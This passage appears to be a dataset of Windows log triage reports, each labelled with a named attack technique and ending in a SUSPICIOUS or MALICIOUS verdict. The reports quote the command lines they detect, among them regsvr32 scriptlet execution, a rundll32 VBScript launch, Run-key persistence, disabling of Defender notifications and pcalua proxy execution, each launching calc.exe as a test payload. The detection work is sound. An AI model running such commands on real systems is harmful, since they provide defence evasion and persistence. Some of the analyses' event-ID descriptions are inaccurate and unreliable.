    - **Security Log (Event ID 4616)**: Corresponds to the time change events. The activity was conducted under the LOCAL SERVICE account. These match with the time change events in system logs, seeming benign as they are system-initiated.
    - **Logon Events (Event ID 4624, 4672)**: Log entries show SYSTEM logons typically representing system or service actions, which is standard behavior in Windows environments so there’s no immediate concern here regarding privilege escalation.

2. **PowerShell and Process Execution:**
    - **PowerShell Execution**: Repeated instances of `powershell.exe` executing a suspicious command involving `rundll32.exe` attempting to load `calc.png` as a library. This is suspicious because `calc.png` is not a standard executable or DLL file format. This could indicate a malicious attempt to bypass security controls using non-standard naming to hide malicious code.
    - **Sysmon Events (Event ID 1, 5 for PowerShell and Rundll32)**: Show `PowerShell` executing commands that may attempt to execute a function within a PNG file. This is atypical as it implies image files serving executable code, potentially indicative of code injection or exploitation tactics.

3. **Edge Update Processes:**
    - **Edge Update Events**: The creation and execution patterns of Edge Update processes in the Sysmon logs appear regular and match typical background service updates, but the volume of executions, especially in temporary directories, could be reviewed further to rule out any packaging or tampering attempts. However, more information would be needed to flag this conclusively.

### Assessment and Resolution:
- **Suspicious Activity**:
    - The behavior involving `rundll32.exe` and `calc.png` strongly suggests a potential compromise or obfuscation attempt to run hidden code, which does not align with typical benign usage. 
    - The repetitive entries without an identifiable legitimate use for what is presented as an image file (calc.png) being executed should be investigated further.

### Recommendation:
- **Analysis of the marked suspicious PowerShell activity is recommended**: 
  - Conduct a thorough investigation of the file path and contents of `calc.png`.
  - Capture and examine network traffic around the time of these logs for potential external communication.
  - Check the integrity and recent changes of the `rundll32.exe` process and any scripts that may be running in conjunction.
- **Implement enhanced logging and monitoring** to spot similar unusual executions in the future.

### Final Resolution:
- **SUSPICIOUS**: While clear signs of illegitimate execution attempts exist, additional investigation is needed to confirm malicious intent and scope if confirmed, how deeply it may extend throughout the system or network.

Activate Windows NoDesktop Group Policy Feature,"Upon careful analysis of the provided Windows event logs, the following observations and assessments have been made:

1. **Windows Defender Status:**
   - The Application log shows Windows Defender is active and running (`SECURITY_PRODUCT_STATE_ON`). This is usually a positive sign as it indicates that a primary line of defense is operational.

2. **EdgeUpdate Service Activities:**
   - There are multiple instances in the Application and Sysmon logs where the `edgeupdate` service stops and starts various processes related to Microsoft Edge updates, such as `MicrosoftEdgeUpdate` and `MicrosoftEdgeUpdateSetup`. The presence of these logs indicates Edge is performing updates. Given this application's role in updating software components, these processes appear routine, matching typical non-malicious software update behavior.

3. **Event Logs and Process Executions:**
   - In the Sysmon logs, there are multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`, and several administrative utilities such as `cmd.exe` and `reg.exe` are being utilized.
   - A command was executed to modify the registry by adding a policy (`NoDesktop`) through `cmd.exe` with high integrity, but it's not defined if this action is planned or a legitimate administrative operation.
   - The command ladders identified (i.e., command line execution followed by process creations like `reg.exe`) may suggest script automation or could indicate unauthorized administrative activity.

4. **Time Changes:**
   - Event 4616 in the Security and System logs indicates time adjustments performed by the system process `svchost.exe`. Time synchronization events like these can trigger alerts but are common in Windows environments due to time sync requirements with external NTP servers.

5. **Use of Wsmprovhost.exe:**
   - The parent process for some observed activities is `wsmprovhost.exe`, a legitimate Windows service allowing for PowerShell and remote management tasks. No direct signs indicate how these executions fit into legitimate administrative workflows, and they may align with typical system administration or automation scripts.

**Assessment and Recommendations:**

- The gathered logs reveal a mixture of benign and potentially suspicious activity typically seen in administrative action. However, the registry modification and excess of command-line executions, especially given that this is the CEO's machine, warrant further analysis.
- Activities such as registry changes (`reg add`) should be verified against IT or security change management records to confirm legitimacy.
- Ensure that any scripts or automation running on the CEO's machine adhere to security policy, and confirm that `admin_test` has legitimate access rights for such operations.
- Ensure the time adjustments and network activity align with expected patterns for time synchronization and network policies.

Given these findings and without additional context or anomalies specifically indicating malicious intent, the most prudent assessment is:

**Resolution: SUSPICIOUS**

Further investigation would be warranted to clarify whether the administrative commands and activities were authorized. This step is crucial to rule out insider threats or unauthorized administrative access that may lead to potential compromise."
Windows Modify Show Compress Color And Info Tip Registry,"Based on the provided Windows event logs, here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Command Line Usage:**
   - There are multiple instances of the `cmd.exe` process executing command-line operations with registry modifications (`reg add`). This is relatively unusual and could be a sign of a script or automated task altering system settings. The exact command observed is: 
     ```
     ""cmd.exe"" /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f & reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f
     ```
   - Frequent use of `wevtutil.exe`, which is a legitimate tool for managing event logs but can be used maliciously to clear logs or collect logs for exfiltration.

2. **Execution of Known Utilities:**
   - Numerous instances of typical system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`, initiated by a user `SERVER002\admin_test`. While these tools can be used for legitimate purposes, their frequent execution in quick succession might indicate automated or scripted activity.

3. **Process Privileged Execution:**
   - Several processes are running with `High Integrity Level`. While it's normal for system processes, if these processes were spawned by unexpected origin, it could be a privilege escalation attempt.

4. **Microsoft Edge Update Activity:**
   - A large number of executions related to Microsoft Edge Update processes, such as `MicrosoftEdgeUpdate.exe` and related setup and registration components. While it is common for updates to occur, the sheer volume and frequency, alongside the creation of executables in temporary directories, might warrant further scrutiny to ensure it aligns with expected update patterns.

### Potential Indicators of Malicious Activity:

- **Registry Modifications:** The use of `reg.exe` to alter Explorer settings is highlighted as potentially suspicious. Modifying the registry to change system behavior may be part of a malware persistence strategy.
  
- **Excessive Use of CMD and Scripting Tools:** The combination of PowerShell, `cmd.exe`, and registry modifications can be suspicious if not part of routine administrative tasks or automation that the system typically performs.

### Assessment and Conclusion:

The provided logs suggest activities that could be automated or scripted, but there is not enough evidence to conclusively indicate compromise. The actions involving registry modifications and event utilities in rapid succession warrant further investigation. Additionally, the frequency and style of processes related to Microsoft Edge updates should be validated against known corporate update behavior.

### Resolution:

**Resolution: SUSPICIOUS**

**Recommended Actions:**
- **Investigate User Activities:** Review recent actions of the user `admin_test` to ascertain whether they initiated these processes as part of legitimate administrative tasks.
- **Check for Approved Scripts/Automation:** Validate if any scripts or automated tools were supposed to perform the observed registry modifications and process executions.
- **Monitor for Persistence or Exfiltration Attempts:** While current logs provide no direct evidence of data exfiltration or persistence methods, continuous monitoring for such activities is advisable.
- **Validate Update Patterns:** Confirm whether the Microsoft Edge Update processes and paths are consistent with standard update strategies and not indicative of any hijack.

Proceed with caution and further investigate these elements to determine if there might be underlying malicious intent or confirm benign automation/configuration management activity."
Modify Registry of Local Machine - cmd,"### Log Analysis:

1. **Unusual Process Execution**:
   - There are multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These processes are typical system processes, but frequent execution might indicate attempts to manipulate event logs or to handle console outputs programmatically.
   - `HOSTNAME.EXE` and `whoami.exe` executions are logged, which by themselves are benign but could indicate information gathering or scripting activities.
   - Notably, there is a `cmd.exe` process execution with a command that adds a registry entry to start `calc.exe` during system boot:
     ```
     ""cmd.exe"" /c reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f
     ```

2. **Suspicious Command-Line Arguments**:
   - The command executed by `cmd.exe` to modify the registry is highly suspicious. The action of adding an entry to persistently run `calc.exe` during system boot indicates an attempt to establish persistence, which is a common tactic in malware behavior.

3. **Privilege Escalation**:
   - All suspicious activities appear to be executed under the `SERVER002\\admin_test` account with high integrity level, indicating significant privileges. This account might be compromised or misused.

4. **EdgeUpdate Activity**:
   - There is consistent logging of `MicrosoftEdgeUpdate` processes, which appear normal as they are related to Microsoft Edge updating activities and are executed by `NT AUTHORITY\\SYSTEM`, showing no signs of tampering.

5. **Time Change Events**:
   - There are logs indicating a time change on the machine, which can be normal system behavior but can also indicate an attempt to interfere with logs or scheduled tasks. However, here it seems benign because performed by a legitimate system service (`svchost.exe`).

### Assessment:

- **Key Indicator**: The registry modification to start `calc.exe` is a clear indicator of malicious activity, suggesting a persistence mechanism typically employed by malware.
- **User Account Misuse**: Actions performed by `SERVER002\\admin_test` suggest it may be compromised.

### Resolution: MALICIOUS

### Guidance and Next Steps:
1. **Immediate Actions**:
   - Investigate the `SERVER002\\admin_test` account for unauthorized access or misuse.
   - Remove the malicious registry entry added for `SecurityHealth` running `calc.exe`.

2. **Containment**:
   - Isolate the affected system (Server002) from network communication until a full investigation is complete.
   - Change passwords for potentially compromised accounts.

3. **Further Investigation**:
   - Perform a thorough review of recent login activity and access logs for `SERVER002\\admin_test`.
   - Check for additional persistence mechanisms or modifications in system configurations.

4. **Remediate and Monitor**:
   - Conduct a complete malware scan and ensure all systems are patched and secure.
   - Monitor logs continuously for abnormal activity and re-enable security measures if disabled.

5. **Documentation and Communication**:
   - Document all findings and actions taken for future reference.
   - Communicate with relevant stakeholders to maintain awareness and reinforce security practices."
Indirect Command Execution - pcalua.exe,"Upon analyzing the provided Windows event logs, I have identified several activities that require further explanation:

1. **Sysmon Events**:
   - There are multiple executions of standard utilities like `hostname.exe`, `whoami.exe`, and `cmd.exe`. These tools are usually benign but their execution could be indicative of reconnaissance activities if there are no justifying business needs.

2. **Command Execution via CMD**:
   - There is a Sysmon event showing the execution of `cmd.exe` with the command-line: `""cmd.exe"" /c pcalua.exe -a calc.exe & pcalua.exe -a C:\\Windows\\System32\\calc.exe`. This command is notable because it chains two instances of `Program Compatibility Assistant Launcher Utility` to open Calculator twice. Although `calc.exe` is a harmless application, this method of execution is unconventional and suspicious. It could potentially be used to test for certain system behaviors or bypass certain restrictions.

3. **Use of Administrative-level Programs by Server User**:
   - The logs indicate various uses of high-integrity applications like `wevtutil.exe`, which is a command-line utility to retrieve event logs. This could suggest an administrator or script running queries or clearing event logs, actions which could be used by an attacker to cover tracks.

4. **High-Volume Process Creation**:
   - The rapid and high volume of process creations (like `conhost.exe` associated with console windows) could be suspicious if not typical of the user's activity.

5. **Background Service Processes**:
   - Processes like `sppsvc.exe` (Software Protection Platform Service), `TrustedInstaller.exe`, and `WmiPrvSE.exe` (WMI Provider Host) running under system-level accounts are typical of maintenance activities but can be misused for lateral movement or privilege escalation.

Overall, while the logs on their own do not confirm malicious activity, the pattern of behavior (e.g., unconventional command usage, frequent use of system utilities) suggests that this activity is suspicious and warrants further investigation. The use of standard administrative tools and execution patterns may fit within a normal administrative activity scope, but without context indicating such, they are suspicious.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Verify the legitimacy of the accounts associated with high-integrity processes to ensure they are not compromised.
- Investigate any justifications for the repeated `pcalua.exe` executions and if it falls under normal administrative tasks.
- Run a full endpoint detection and response (EDR) toolset scan to check for any other signs of compromise.
- Review user activity logs, particularly for the `admin_test` account, to understand if these actions fit usual behavior or are out-of-pattern.
- Consider alerting if no valid reasoning backs up these events, and possibly disabling the account and changing credentials if the account is suspected to be compromised."
Disable Win Defender Notification,"**Analysis of Windows Event Logs:**

1. **Time Change Indicators:**
   - **System and Security Logs:**
     - There are multiple `EventID 4616` in the Security log, indicating a system time change initiated by `svchost.exe`. Time changes should generally be controlled and are potential indicators of tampering, possibly attempting to evade detection mechanisms based on timestamps.
     - The Kernel-General logs (`EventID 1`) show similar time change events, with svchost.exe responsible for the change.

2. **Sysmon Logs:**
   - Multiple instances of `cmd.exe` and `reg.exe` execution under the `admin_test` user context. Specifically, the command executed was:
     ```
     cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications"" /v ""DisableNotifications"" /t REG_DWORD /d 1 /f
     ```
     - This command disables Windows Defender notifications, which could be a tactic to hinder visibility of further malicious actions.
  
3. **Use of `wevtutil.exe` and `conhost.exe`:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` under the same `admin_test` user with no detailed command-line arguments listed, which could indicate log clearance or querying activities to hide malicious traces.
  
4. **Windows Update Process:**
   - **Microsoft Edge Update:**
     - Numerous logs show legitimate activity related to Microsoft Edge updating processes. However, these processes are not suspicious and match typical update behaviors.

5. **No Evidence of Malicious Payloads or Significant Suspicious Network Activity:**
   - Logs do not indicate any direct payload execution or outbound suspicious network connections which would typically suggest data exfiltration or malware communication channels.

**Assessment:**
- The combination of system time alterations, registry modifications to silence antivirus notifications, and possible log-clearing attempts through `wevtutil.exe` suggest suspicious activities. These activities could potentially indicate the precursors to more extensive attacks or active attempt to cover tracks of existing compromises.

**Guidance and Resolution:**
1. **Immediate Review:** 
   - Conduct a thorough review of the `admin_test` account's activity. Investigate the legitimacy and necessity of the actions performed by this user.
  
2. **Time Synchronization and Monitoring:**
   - Ensure that time-change events are monitored and unexpected changes are investigated swiftly.

Given the logs and analysis provided, the events require more investigation to determine the presence and extent of any potential compromise. Therefore, the resolution is **SUSPICIOUS**."
Javascript in registry,"### Analysis of the Logs

#### Suspicious Activities Identified:
1. **PowerShell Activity:**
   - Multiple PowerShell processes executed a command to create a new item property in the registry under `HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings`. The value being set is `""<script>""`, which is highly suspicious. This could be an attempt to enable script execution or hijack browser settings for malicious purposes.

2. **Time Manipulation:**
   - The security and system logs show changes in the system time (`NewTime` and `OldTime` entries in the EventID 4616). Unauthorized time changes can be indicative of attempts to evade detection or manipulate log timestamps.

3. **Privileged Access:**
   - The user `SERVER002\admin_test` has several logs indicating the execution of commands with high integrity levels and privileged rights (`SeSecurityPrivilege, SeBackupPrivilege, etc.`). The presence of these privileges coupled with unusual activities could suggest misuse or compromise of the admin account.

4. **Unusual Processes:**
   - A process `powershell.exe` was launched with a command intended to modify the registry settings, exhibiting behavior typically associated with malicious script execution.
   - Several Microsoft Edge Update processes are seen executing commands, which appear to be routine updates. However, their frequency and the inclusion of multiple Edge update paths (including temporary directories) may warrant further examination to confirm legitimacy.

5. **Potential Indicator of Persistence:**
   - The creation of registry entries as observed could potentially be indicative of an attempt to maintain persistence on the system.

#### Assessment of Malicious Activity:
Based on the analysis of the logs, it appears there are strong indicators of potentially malicious activity:
- The PowerShell command inserting a `<script>` in the registry suggests possible malicious intent.
- Unauthorized timestamp manipulation in the logs indicates an attempt to obfuscate activity.
- The execution of high-privileged operations by `admin_test`, combined with time changes and unusual PowerShell usage, heightens the suspicion of a security compromise.

### Conclusion
The detailed analysis leads to the conclusion that these logs contain evidence of malicious activity. The PowerShell executions, privilege elevations, time manipulation, and the use of high-integrity processes are consistent with tactics used by attackers for compromise and persistence.

### Resolution: **MALICIOUS**

### Recommended Actions:
- **Immediate Investigation:** Conduct a more detailed forensic investigation into the affected system, `Server002`, to identify the full scope and impact of the compromise.
- **Isolate the System:** Temporarily isolate the suspected machine from the network to prevent further unauthorized access or dissemination of malicious activity.
- **Credential Review:** Reset credentials for `admin_test` and possibly all accounts on the system to mitigate credential misuse.
- **Registry and File Analysis:** Examine registry changes and any files related to PowerShell script execution for signs of malware.
- **Monitor for Indicators of Compromise:** Enhance monitoring to detect similar patterns and anomalous behavior across all critical systems in the network.
- **Patch and Update:** Ensure all systems are patched and updated, particularly with regard to browsers and their update mechanisms.

Proceed with these actions to contain and remediate the security threat effectively."
Rundll32 execute VBscript command using Ordinal number,"### Detailed Analysis:

1. **Suspicious Command Execution:**
   - A **rundll32.exe** instance is launched with an unusual and obfuscated command line:
     ```shell
     rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
     ```
   - This entry is highly suspicious as it uses a technique often associated with code execution or exploitation attempts via script, invoking a calculator which might be part of testing or proof-of-concept for deeper malicious activity.

2. **Process Hierarchy:** 
   - The `cmd.exe` that executes this command is spawned by `wsmprovhost.exe`, which is part of Windows Remote Management (WinRM). This sequence can suggest remote execution or command line usage that could be abnormal for this process, depending on patterns of normal operation for the CEO's machine.

3. **High-Privilege Commands:**
   - A number of processes run under elevated privileges, but without apparent immediate context, such as **whoami.exe**, **conhost.exe**, **wevtutil.exe**, **hostname.exe**, other common administrative tools, involved in:
     - Checking user identities
     - Adjusting system configurations or logs
   - However, these actions isolated do not directly indicate malware without further context from what led to them.

4. **Time Change Events and Logs:**
   - There is a series of logs indicating changes in the system time. This could point to a potential ""time stomp"" where a user tries to mitigate logging of their actions by adjusting system time.

5. **Service Installation/Claims:**
   - Many Microsoft Edge updates/installs are listed. These routine updates shouldn’t inherently raise suspicion unless they coincide unusually with operational anomalies or security incidents.

6. **Security Privileges:**
   - Multiple uses of admin privileges are noted. While normal on a CEO’s machine, significant context or correlation with outside events is key to understanding if it is part of malicious orchestration.

### Assessment:

- **SUSPICIOUS** – The key finding here is the suspicious `rundll32.exe vbscript` command execution, which could indicate malicious activity.
- While Microsoft Edge update activities and typical admin tool executions are present, the sequence involving an obfuscated script to launch `calc.exe` is notably suspicious and merits immediate deeper investigation to rule out compromise or unauthorized activities.

### Guidance on Proceeding:

- **Conduct a Thorough Investigation:**
  - Collect additional context regarding recent emails, downloads, or external communications that might indicate phishing or initial access signs.
  - Analyze network traffic patterns around the timestamps of these logs to detect abnormal connections possibly associated with the suspicious command execution.
  - Review and potentially take memory dumps or disk images to identify if any malicious scripts, loaders, or persistence mechanisms are present.

- **Verify With EDR Solutions:**
  - Use endpoint detection and response (EDR) solutions to scan and confirm the integrity of the related processes and correlate with broader threat intelligence.

- **Monitor and Lockdown Procedures:**
  - Increase monitoring on this system, ensuring any new anomalies are rapidly detected.
  - Consider implementing restrictive network or execution policies if necessary to prevent potential lateral movement or data exfiltration."
Invoke HTML Application - Jscript Engine Simulating Double Click,"### Analysis of Windows Event Logs

#### Indicators of Malicious Activity:

1. **PowerShell Usage:**
   - Multiple instances of `powershell.exe` execution are observed in the logs. Specifically, the execution of PowerShell with a command line that contains `Invoke-ATHHTMLApplication` with an HTA file (`Test.hta`) and the inclusion of a scripted command (`-ScriptEngine JScript -SimulateUserDoubleClick`). This kind of behavior is highly suspicious because:
     - It involves the execution of an HTA (HTML Application), which is commonly associated with techniques used by attackers to deliver and execute malicious scripts.
     - The use of scripting languages like JScript within the context of PowerShell is indicative of possible exploitation or scripting attacks.

2. **Process Execution Patterns:**
   - The creation of multiple processes such as `conhost.exe` and `wevtutil.exe` in a very short span of time during and after the PowerShell execution, particularly with the `admin_test` account, indicates potential misuse or abuse of these processes for unconventional purposes.
   - Sequence and timing of these process executions suggest possible attempts to manipulate or access event logs (`wevtutil.exe` is used for such purposes).

3. **UsoClient Execution:**
   - `UsoClient.exe` with the command `StartStoreUpdates` might be a legitimate process related to Windows Update, however, attackers sometimes use such processes for masquerading or to maintain persistence by blending into normal system activity.

4. **Commands like `whoami` and `hostname`:**
   - Execution of commands such as `whoami.exe` and `hostname.exe` might not be inherently malicious but are often used by attackers post-exploitation to gather information about the system and user context they are operating under.

5. **Execution Contexts:**
   - The `User` context described in many events as `SERVER002\\admin_test` appears consistently through various suspicious activities, indicating that the account may have been compromised.
   - High integrity level usage during the execution of these activities indicates potential privilege escalation attempts.

#### Assessment and Recommendations:

Given the use of suspicious PowerShell command invocation, execution of scripts potentially used for malicious activity, and rapid succession of process creations that appear to interact with critical system components (event logs), the activities in the logs suggest the presence of indicators consistent with targeted attack methodologies.

**Conclusion: MALICIOUS.**

#### Recommendations:

- **Immediate Actions:**
  - Isolate the affected machine (Server002) to prevent further lateral movement or data exfiltration.
  - Review and possibly disable the `admin_test` user account to stop any ongoing malicious activities using this account.
  - Perform memory and disk forensic analysis on the system to identify any potential backdoors or further evidence of compromise.

- **Further Investigation:**
  - Conduct a deeper analysis of network traffic originating from and directed to the affected host around the time of these events.
  - Analyze the HTA file (`Test.hta`) and any referenced or downloaded scripts for malicious payloads, even if they appear benign on surface inspection.

- **Preventive Measures:**
  - Implement stricter PowerShell logging and script execution policies.
  - Ensure regular updates and patches are applied to all systems to protect against known vulnerabilities.
  - Enhance endpoint detection and response (EDR) capabilities to alert on similar suspicious patterns in the future.

Taking these actions should help mitigate any ongoing threats and improve overall security posture against such executed malicious activities."
Activate Windows NoClose Group Policy Feature,"### Detailed Analysis of Logs:

#### Security Log Analysis:
1. **Event ID 4616 (Audit Policy Change):**
   - The logs indicate a time change event on `Server002` initiated by the process `svchost.exe`. The time change event might seem unusual, but it lacks evidence of malicious intent. This could be attributed to system time synchronization via NTP (Network Time Protocol).

#### Application Log Analysis:
1. **Service Stopped Events:**
   - The `edgeupdate` service reports being stopped multiple times. While this could suggest tampering, it is common for services to stop and start regularly, especially if updates or maintenance activities are ongoing.
   
2. **Software Protection Service (Event ID 16384):**
   - This event corresponds to routine maintenance by the Windows Software Protection Platform Service (`sppsvc.exe`), and no immediate threat is associated with it.

#### Sysmon Log Analysis:
1. **Usage of `wevtutil.exe` and `conhost.exe`:**
   - The execution of `wevtutil.exe`, which is used for managing event logs, by user `admin_test` is notable. Although `wevtutil.exe` can be used for legitimate administrative tasks, it can also be leveraged by attackers to delete or manipulate logs to cover tracks.
   - `conhost.exe` appears frequently, which by itself is not suspicious due to its role in command-line operations.
   
2. **Suspicious Command Execution:**
   - Notably, a `cmd.exe` process executed a command to add a registry key under `CurrentVersion\Policies\Explorer` with a value `NoClose`. This action restricts certain user operations. Modifying registry keys in such a manner could be indicative of malicious behavior, possibly part of persistence mechanisms or restrictions imposed by malware.
   
3. **Frequent EdgeUpdate Executions:**
   - The repeated execution of `MicrosoftEdgeUpdate.exe` with different command lines and integrity levels is intended behavior for updating browser components. However, the execution from temporary paths (`Temp\\EU9BB9.tmp`) merits attention to verify if those actions are part of a legitimate update process or potentially manipulated.

### Assessment of the Situation:
- **Suspicious Registry Modification:** The registry modification executed through `cmd.exe` is particularly concerning as it reflects a potential indicator of compromise, suggesting an attempt to alter system behavior.
  
- **Repeated Use of Administrative Utilities:** Utilization of administrative utilities (`wevtutil.exe`) without explicit need or documentation could suggest log tampering efforts.
  
- **Service and Update Activity:** The stopping and execution of multiple services related to updates, particularly with paths involving temporary directories, could potentially mask other activities but align with typical update operations.

### Guidance and Conclusion:
- **Verification and Monitoring:** Verify the legitimacy of registry modifications and ensure that they align with expected configurations or policies. Examine whether these modifications revert post-certain user activities or if they're indicative of persistence.
  
- **Service and Update Logging:** Ensure that service stopping and starting activities align with maintenance routines, and examine logs for evidence of unauthorized service manipulation or unusual application startups. 

- **User and Process Monitoring:** Keep activity on known accounts (e.g., `admin_test`) and sensitive processes like `wevtutil.exe` under close review for future actions that may indicate misuse.

**Resolution: SUSPICIOUS**
- While there are indicators that suggest possible malicious activities (e.g., registry modifications, use of `wevtutil.exe`), further investigation into the context of registry changes and verification against known benign behaviors are required to reach a definitive conclusion."
Regsvr32 local COM scriptlet execution,"As a Senior Security Analyst, I've analyzed the provided Windows Event Logs, focusing on detecting any potential malicious activity. Here's my detailed analysis:

### Analysis:

1. **Suspicious Process Execution**:
   - A critical observation is the execution of `regsvr32.exe` with the command line: 
     ```
     ""cmd.exe"" /c C:\Windows\system32\regsvr32.exe /s /u /i:""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\src\RegSvr32.sct"" scrobj.dll
     ```
   - The usage of `regsvr32` with a `.sct` script file is a common technique used for executing scripts remotely or bypassing security measures, often seen in attack vectors.

2. **Process Parent-Child Relationships**:
   - The parent process for `cmd.exe` that executed the potentially malicious `regsvr32.exe` command is `wsmprovhost.exe`, which is uncommon and can be indicative of a misuse of the `wsmprovhost` process to initiate malicious commands.

3. **High Integrity Level**:
   - The processes involved (`regsvr32.exe`, `cmd.exe`, and `conhost.exe`) are running with a high integrity level, indicating they have elevated permissions which can be more dangerous if leveraged maliciously.

4. **Logs Consistency**:
   - The execution of `MicrosoftEdgeUpdate.exe` and its related processes appears benign, as it resembles typical software update activities with processes signed by Microsoft Corporation.

5. **Other Anomalies**:
   - The frequent invocation of `wevtutil.exe` could be part of regular logging maintenance, but should be investigated further to ensure it’s not being used to tamper with Windows logs.

### Threat Assessment:

Based on the suspicious execution of `regsvr32.exe` with an external script and unusual process chaining with `wsmprovhost.exe`, I assess this activity as **potentially malicious**.

### Risks Identified:
- Execution of potentially malicious scripts which could allow remote code execution or unauthorized actions if the `.sct` file is indeed malicious.
- Possible evasion techniques or attempts to manipulate system logs.

### Guidance on How to Proceed:
- **Deeper Investigation**:
  - Review the script file `RegSvr32.sct` to determine its contents and purpose.
  - Check for network communications that might relate to this activity.
  - Verify if there are similar patterns of suspicious activities in other system logs.

- **Immediate Actions**:
  - Isolate the machine to prevent any further potential malicious activity.
  - Conduct a comprehensive malware scan and use threat intelligence to assess hash values and related indicators.

### Resolution:
- **MALICIOUS**: Due to the execution pattern involving `regsvr32.exe` with an SCT script, a known method for conducting malicious operations.
  
Overall, this analysis points towards a likely attempt at leveraging a known malicious script execution vector, necessitating a thorough incident response process."
Command Execution with NirCmd,"Based on the provided event logs, the analysis is as follows:

1. **Security Log Analysis:**
   - **Event ID 4624** and **Event ID 4672**: These logs show successful logons with elevated privileges (SeDebugPrivilege, SeTcbPrivilege, etc.) using the SYSTEM user account. This is a standard operational behavior for SYSTEM-related operations and does not immediately indicate malicious activity.
   - **Event ID 5379**: Multiple unsuccessful credential access attempts are logged with the return code `3221226021`. This suggests failed attempts to access Microsoft Account credentials but is not uncommon without clear context of malicious intent.
   - **Event ID 4798**: Lists the enumeration of local users on the machine. It's noteworthy but not directly indicative of malicious activity without evidence of further misuse or privilege escalation.

2. **Windows PowerShell Log Analysis:**
   - **Event ID 600**: Shows PowerShell executing a command to use nircmd.exe to hide system tray clock. This is a suspicious activity since running external tools to modify window appearance without a known reason can be an indicator of an attempt to disguise activity.

3. **Sysmon Log Analysis:**
   - **NirCmd Execution**: Sysmon logs a PowerShell instance running `nircmd.exe` from a temporary location with a command to hide the tray clock. This could be indicative of an attempt to hide unauthorized activity.
   - **Process Monitoring**: Several legitimate processes run with NT AUTHORITY\SYSTEM, such as svchost.exe and Microsoft Edge Update-related processes. These are normal and part of typical system operations.
   - **Host Process for Windows Tasks**: Multiple executions of critical system-related binaries (taskhostw.exe, sc.exe) were observed, which might coincide with standard system operations.

4. **Application Log Analysis:**
   - **EdgeUpdate** logs show the services stopped, which is a typical log entry when an update is completed.

5. **System Log Analysis:**
   - The logs do not indicate any notable system-level alerts or anomalies.

### Assessment and Conclusion:
- **Suspicious Indicators**: The execution of `nircmd.exe` using powershell from a temporary directory to hide the system tray clock is noteworthy. It suggests possible attempts to manipulate the user interface in a way that serves no legitimate purpose.
- **Benign Indicators**: Most other activities involving elevated privileges and system updates (e.g., Microsoft Edge updates) are standard and not inherently suspicious without corresponding malicious intent.

### Conclusion:
**Resolution: SUSPICIOUS**

- The activity surrounding the use of nircmd.exe via PowerShell warrants further investigation. This could potentially be part of malicious activity trying to obfuscate actions taken on the system. However, there's insufficient evidence within these logs alone to definitively label the activity as malicious without further context or correlating data.

**Guidance on Proceeding:**
1. **Further Investigation**: Investigate the source of the PowerShell script executing `nircmd.exe`. Detect the initiating process and user context to determine if it correlates to an unauthorized user or script execution.
2. **Endpoint Review**: Utilize EDR (Endpoint Detection and Response) tools to trace suspicious scripts or applications and to monitor any other potentially suspicious commands executed.
3. **User Training**: Educate users on the potential threat vectors, particularly involving unauthorized PowerShell scripts and usage scenarios of tools like NirCmd.
4. **Review of Logs**: Continuously review and cross-check logs with threat intelligence to identify harmful activities that may need further action."
DiskShadow Command Execution,"After reviewing the event logs provided, here's a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity:**
   - A PowerShell process was initiated with a command-line involving `diskshadow.exe`, as seen in the logs, e.g., `powershell.exe & {C:\Windows\System32\diskshadow.exe -S C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\data.txt}`. 
   - `diskshadow.exe` is used for managing volume shadow copies; its execution from PowerShell with a script can indicate attempts to access or copy data stealthily, which is concerning for unauthorized data access or backup creation.
   - The command is executed from a temp directory, which is a usual practice to evade detection or conduct malicious activities.

2. **Execution of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` were observed being executed. This tool is typically used for managing event logs, and its frequent automated execution could imply attempts to clear or alter event logs, possibly to hide tracks of malicious activity.
  
### Indicators of Potential Malicious Activity:
- The combination of PowerShell with unusual command-line calls and the use of `diskshadow.exe` in this context is suspicious, as this might indicate preparation for malicious activities such as data exfiltration or tampering.
- `wevtutil.exe` usage through an administrative account is suspicious when there's no known scheduled task or maintenance activity requiring it.
- The involvement of processes with high integrity levels (privilege escalation opportunity) and being executed under an admin user's context further heightens the risk.

### Conclusion:
- The activities noted are characteristic of suspicious behavior for a potential compromise, particularly considering the high-impact systems involved (e.g., a server processing administrative functions).
  
### Resolution:
- **SUSPICIOUS**: The activities logged are atypical and suggest potentially nefarious intent, especially the use of PowerShell and `diskshadow.exe`. Further investigation is warranted to rule out unauthorized or malicious activity.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Review and validate authorized access and use of PowerShell scripts by the user `admin_test`.
   - Inspect the content and purpose of the `data.txt` file within the PowerShell script.

2. **Further Investigation:**
   - Analyze the contents of the directories in use during these activities, specifically for transient or unexplained files, and review the configurations of `diskshadow.exe` scripts if possible.
   - Conduct a deeper analysis of `wevtutil` usage to recognize any attempts to remove logs.

3. **Security Policy:**
   - Restrict the execution of PowerShell scripts or applications like `diskshadow.exe` without explicit authorization or verification.
   - Consider implementing enhanced logging and alert mechanisms for similar PowerShell executions in the future.

These steps should help to confirm if the activities were authorized or if they indicate a potential breach that needs remediation."
Rundll32 advpack.dll Execution,"Upon reviewing the provided Windows event logs, several points of interest and potential concerns arise. Here is a detailed breakdown of the analysis:

### Key Observations:

1. **Frequent Execution of `rundll32.exe`:**
   - `cmd.exe` invoking `rundll32.exe` with the `advpack.dll,LaunchINFSection` command line is particularly suspicious. This command can be used for executing code or installing malicious software hidden in an INF file.
